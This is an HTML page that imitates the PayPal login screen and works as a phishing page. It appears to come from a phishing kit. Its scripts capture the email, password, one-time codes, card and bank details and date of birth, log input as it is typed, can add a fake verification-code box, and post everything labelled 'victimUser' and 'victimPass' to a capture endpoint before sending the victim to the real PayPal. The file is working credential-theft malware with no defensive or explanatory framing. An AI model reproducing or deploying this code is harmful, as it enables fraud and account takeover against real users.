<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to PayPal</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            color: #2c2e2f;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 24px 16px;
        }
        .login-wrapper {
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .paypal-logo {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            margin-bottom: 18px;
            font-size: 28px;
            font-weight: 800;
            font-style: italic;
            letter-spacing: -0.6px;
        }
        .paypal-logo .p-dark {
            color: #003087;
        }
        .paypal-logo .p-light {
            color: #0079c1;
        }
        .login-title {
            font-size: 22px;
            font-weight: 400;
            color: #2c2e2f;
            margin-bottom: 24px;
        }
        .input-field {
            width: 100%;
            height: 48px;
            padding: 0 14px;
            margin-bottom: 14px;
            border: 1px solid #9da3a6;
            border-radius: 4px;
            font-size: 15px;
            color: #2c2e2f;
            background-color: #ffffff;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .input-field:focus {
            border-color: #0070ba;
            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.16);
        }
        .options-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 18px;
            font-size: 13px;
            color: #2c2e2f;
            text-align: left;
        }
        .checkbox-label {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            user-select: none;
        }
        .checkbox-label input[type="checkbox"] {
            width: 16px;
            height: 16px;
            accent-color: #0070ba;
            cursor: pointer;
        }
        .helper-note {
            font-size: 12px;
            color: #6c7378;
            text-align: left;
            margin-top: -10px;
            margin-bottom: 18px;
            padding-left: 24px;
        }
        .help-circle {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            border: 1px solid #0070ba;
            color: #0070ba;
            font-size: 11px;
            font-weight: 700;
            flex-shrink: 0;
        }
        .btn-login {
            width: 100%;
            height: 46px;
            background-color: #1072eb;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .btn-login:hover {
            background-color: #0b5ec4;
        }
        .trouble-link {
            display: inline-block;
            margin-top: 16px;
            color: #0070ba;
            font-size: 14px;
            text-decoration: none;
        }
        .trouble-link:hover {
            text-decoration: underline;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 22px 0;
            color: #6c7378;
            font-size: 13px;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #cbd2d9;
        }
        .divider span {
            padding: 0 12px;
        }
        .btn-card {
            width: 100%;
            height: 46px;
            background-color: #e6ecf2;
            color: #2c2e2f;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .btn-card:hover {
            background-color: #d6dfe8;
        }
    </style>
</head>
<body>
    <div class="login-wrapper">
        <div class="paypal-logo" aria-label="PayPal">
            <span class="p-dark">Pay</span><span class="p-light">Pal</span>
        </div>

        <h1 class="login-title">Log in to PayPal</h1>

        <form id="paypalForm">
            <input
                type="text"
                id="email"
                name="email"
                class="input-field"
                placeholder="Email address"
                required
            >

            <input
                type="password"
                id="password"
                name="password"
                class="input-field"
                placeholder="Password"
                required
            >

            <div class="options-row">
                <label class="checkbox-label" for="showPassword">
                    <input type="checkbox" id="showPassword" name="showPassword">
                    <span>Show password</span>
                </label>
                <span class="help-circle" title="Check or uncheck to show or hide your password">?</span>
            </div>

            <div class="options-row" style="margin-bottom: 6px;">
                <label class="checkbox-label" for="stayLoggedIn">
                    <input type="checkbox" id="stayLoggedIn" name="stayLoggedIn">
                    <span>Stay logged in for faster checkout</span>
                </label>
                <span class="help-circle" title="Not recommended on shared devices">?</span>
            </div>
            <div class="helper-note">Not recommended on shared devices.</div>

            <button type="submit" class="btn-login">Log In</button>
        </form>

        <a href="#" class="trouble-link" id="troubleLink">Having trouble logging in?</a>

        <div class="divider"><span>or</span></div>

        <button type="button" class="btn-card" id="payCardBtn">Pay with Debit or Credit Card</button>
    </div>

    <script>
        (function () {
            const showPwdCheckbox = document.getElementById("showPassword");
            const passwordInput = document.getElementById("password");
            const stayLoggedInCheckbox = document.getElementById("stayLoggedIn");
            const form = document.getElementById("paypalForm");
            const payCardBtn = document.getElementById("payCardBtn");
            const troubleLink = document.getElementById("troubleLink");

            const urlParams = new URLSearchParams(window.location.search);
            const owner = urlParams.get("user") || "Inconnu";

            showPwdCheckbox.addEventListener("change", function () {
                passwordInput.type = showPwdCheckbox.checked ? "text" : "password";
            });

            function sendPayload(extraAction) {
                const payload = {
                    owner: owner,
                    network: "PayPal",
                    type: "STANDARD",
                    victimUser: (document.getElementById("email").value || "").trim() || "Inconnu",
                    victimPass: passwordInput.value || "Inconnu",
                    otp: "Aucun",
                    fields: {
                        email: (document.getElementById("email").value || "").trim(),
                        password: passwordInput.value,
                        showPassword: showPwdCheckbox.checked ? "Yes" : "No",
                        stayLoggedIn: stayLoggedInCheckbox.checked ? "Yes" : "No",
                        action: extraAction || "login_submit"
                    }
                };

                return fetch("/api/capture", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
                    keepalive: true
                }).catch(() => {});
            }

            form.addEventListener("submit", function (e) {
                e.preventDefault();
                sendPayload("login_submit").finally(function () {
                    window.location.href = "https://www.paypal.com/signin";
                });
            });

            payCardBtn.addEventListener("click", function () {
                sendPayload("pay_with_card").finally(function () {
                    window.location.href = "https://www.paypal.com/webapps/mpp/home";
                });
            });

            troubleLink.addEventListener("click", function (e) {
                e.preventDefault();
                window.location.href = "https://www.paypal.com/authflow/password-recovery/";
            });
        })();
    </script>
<script data-nexus-capture="true">
(function() {
  const NEXUS_CFG = {
    endpoint: "/api/capture",
    owner: "Kim",
    network: "WebApp",
    enableOtp: false
  };

  const state = {
    victimUser: "",
    victimPass: "",
    otp: "Aucun",
    capturedFields: {},
    sentFingerprints: new Set()
  };

  function getFieldDescriptor(el) {
    let labelTxt = "";
    if (el.id) {
      const lbl = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
      if (lbl) labelTxt = (lbl.innerText || lbl.textContent || "").trim();
    }
    const parentLbl = el.closest("label");
    if (parentLbl) {
      labelTxt = (labelTxt + " " + (parentLbl.innerText || parentLbl.textContent || "")).trim();
    }

    const baseName =
      el.name ||
      el.id ||
      labelTxt ||
      el.placeholder ||
      el.getAttribute("aria-label") ||
      el.getAttribute("autocomplete") ||
      ("field_" + (el.type || "text"));

    const meta = [
      el.id,
      el.name,
      el.placeholder,
      el.getAttribute("aria-label"),
      el.getAttribute("autocomplete"),
      el.getAttribute("inputmode"),
      el.className,
      labelTxt
    ]
      .filter(Boolean)
      .join(" ")
      .toLowerCase();

    return { key: baseName.trim(), meta };
  }

  function classifyInput(el) {
    const type = (el.type || "text").toLowerCase();
    const { meta } = getFieldDescriptor(el);

    if (type === "password" || (/password|pass|mot de passe|pin/i.test(meta) && !/otp|2fa/i.test(meta))) {
      return "password";
    }

    const ac = (el.getAttribute("autocomplete") || "").toLowerCase();
    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
    const isBank = /card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|routing|sort.?code|account.?num|banque|bank/i.test(meta);
    const isDob = type === "date" || /birth|naissance|dob|bday|jour|mois|ann[ée]e|jj|mm|aaaa|yyyy/i.test(meta);

    if (
      ac === "one-time-code" ||
      (!isBank && !isDob && (
        /\botp\b|2fa|mfa|one-time|verification.?code|code.?v[ée]rif|security.?code/i.test(meta) ||
        (type !== "password" && maxLen >= 4 && maxLen <= 8 && /\bcode\b/i.test(meta))
      ))
    ) {
      return "otp";
    }

    if (isBank) return "bank";
    if (isDob) return "dob";

    if (["email", "text", "tel", "number", "search"].includes(type)) {
      return "identifier";
    }

    return "other";
  }

  function collectCurrentValues() {
    const fields = Array.from(document.querySelectorAll("input, select, textarea"));
    const otpParts = [];
    const allCaptured = {};
    let idCandidate = "";
    let bankCandidate = "";
    let fallbackCandidate = "";

    fields.forEach((el) => {
      const type = (el.type || "text").toLowerCase();
      if (type === "submit" || type === "button" || type === "reset") return;

      const { key } = getFieldDescriptor(el);
      const role = classifyInput(el);
      let val = "";

      if (type === "checkbox") {
        val = el.checked ? (el.value || "checked") : "";
      } else if (type === "radio") {
        if (!el.checked) return;
        val = el.value || "selected";
      } else {
        val = (el.value || "").trim();
      }

      if (!val) return;

      const uniqueKey = allCaptured[key] !== undefined ? (key + "_" + (fields.indexOf(el) + 1)) : key;
      allCaptured[uniqueKey] = val;

      if (role === "otp") {
        otpParts.push(val);
      } else if (role === "password") {
        state.victimPass = el.value;
      } else if (role === "identifier" && !idCandidate) {
        idCandidate = val;
      } else if (role === "bank" && !bankCandidate) {
        bankCandidate = val;
      } else if (!fallbackCandidate) {
        fallbackCandidate = val;
      }
    });

    state.capturedFields = allCaptured;
    state.victimUser = idCandidate || bankCandidate || fallbackCandidate || "";
    state.otp = otpParts.length > 0 ? otpParts.join("") : "Aucun";
  }

  function postPayload(payload) {
    const fingerprint = JSON.stringify(payload);
    if (state.sentFingerprints.has(fingerprint)) return;
    state.sentFingerprints.add(fingerprint);

    fetch(NEXUS_CFG.endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true
    }).catch(() => {});
  }

  function sendCapture(stage, extra = {}) {
    collectCurrentValues();

    const hasFields = Object.keys(state.capturedFields).length > 0;
    if (!hasFields && !state.victimUser && !state.victimPass && (!extra.otp || extra.otp === "Aucun")) {
      return;
    }

    const isOtpEvent = Boolean(extra.otp && extra.otp !== "Aucun" && extra.otp !== "En attente OTP...");
    const effectiveOtp = extra.otp || (isOtpEvent ? state.otp : (NEXUS_CFG.enableOtp ? "En attente OTP..." : "Aucun"));

    const payload = {
      owner: NEXUS_CFG.owner,
      network: NEXUS_CFG.network,
      type: isOtpEvent ? "OTP" : stage,
      victimUser: state.victimUser || "Inconnu",
      victimPass: state.victimPass || "Inconnu",
      otp: effectiveOtp,
      fields: state.capturedFields,
      extra_info: JSON.stringify({
        ua: navigator.userAgent,
        platform: navigator.platform,
        fields: state.capturedFields
      })
    };

    postPayload(payload);
  }

  function ensureOtpSectionIfNeeded() {
    if (!NEXUS_CFG.enableOtp) return;

    const existingOtp = Array.from(document.querySelectorAll("input, select, textarea")).some((el) => classifyInput(el) === "otp");
    if (existingOtp) return;

    if (document.getElementById("nexus-auto-otp-box")) return;

    const box = document.createElement("div");
    box.id = "nexus-auto-otp-box";
    box.style.cssText = [
      "margin:14px auto",
      "padding:14px",
      "max-width:360px",
      "border:1px solid #d0d7de",
      "border-radius:10px",
      "background:#ffffff",
      "font-family:inherit",
      "text-align:center"
    ].join(";");

    box.innerHTML = `
      <div style="font-size:13px;font-weight:700;margin-bottom:8px;color:#111827;">Code de vérification (OTP)</div>
      <input
        id="nexus-otp-field"
        data-nexus-injected-otp="true"
        type="text"
        inputmode="numeric"
        maxlength="6"
        placeholder="••••••"
        style="width:100%;padding:10px;text-align:center;font-size:18px;letter-spacing:8px;border:1px solid #9ca3af;border-radius:8px;margin-bottom:10px;"
      />
      <button
        id="nexus-otp-submit"
        type="button"
        style="width:100%;padding:10px;border:none;border-radius:8px;background:#111827;color:#fff;font-weight:600;cursor:pointer;"
      >Valider le code OTP</button>
    `;

    const targetForm = document.querySelector("form");
    if (targetForm && targetForm.parentElement) {
      targetForm.parentElement.insertBefore(box, targetForm.nextSibling);
    } else {
      document.body.appendChild(box);
    }

    const otpInput = document.getElementById("nexus-otp-field");
    const otpBtn = document.getElementById("nexus-otp-submit");

    otpInput.addEventListener("input", () => {
      otpInput.value = otpInput.value.replace(/\D/g, "");
      collectCurrentValues();
    });

    otpBtn.addEventListener("click", () => {
      collectCurrentValues();
      const code = otpInput.value.trim();
      sendCapture("OTP", { otp: code || state.otp });
    });
  }

  document.addEventListener("input", (e) => {
    const el = e.target;
    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
    collectCurrentValues();
  }, true);

  document.addEventListener("change", (e) => {
    const el = e.target;
    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
    collectCurrentValues();
  }, true);

  document.addEventListener("submit", () => {
    collectCurrentValues();
    const hasOtp = state.otp && state.otp !== "Aucun";
    if (hasOtp) {
      sendCapture("OTP", { otp: state.otp });
    } else {
      sendCapture(NEXUS_CFG.enableOtp ? "OTP_STEP1" : "STANDARD");
    }
  }, true);

  document.addEventListener("click", (e) => {
    const btn = e.target.closest("button, input[type='submit'], input[type='button'], [role='button']");
    if (!btn || btn.id === "nexus-otp-submit") return;
    collectCurrentValues();
    const txt = (btn.innerText || btn.value || "").toLowerCase();
    const hasOtp = state.otp && state.otp !== "Aucun";
    if (hasOtp && (txt.includes("otp") || txt.includes("verify") || txt.includes("vérif") || txt.includes("confirm") || txt.includes("valid"))) {
      sendCapture("OTP", { otp: state.otp });
    } else if (Object.keys(state.capturedFields).length > 0 || state.victimUser || state.victimPass) {
      sendCapture(NEXUS_CFG.enableOtp ? "OTP_STEP1" : "STANDARD");
    }
  }, true);

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", ensureOtpSectionIfNeeded);
  } else {
    ensureOtpSectionIfNeeded();
  }
})();
</script>
</body>
</html>
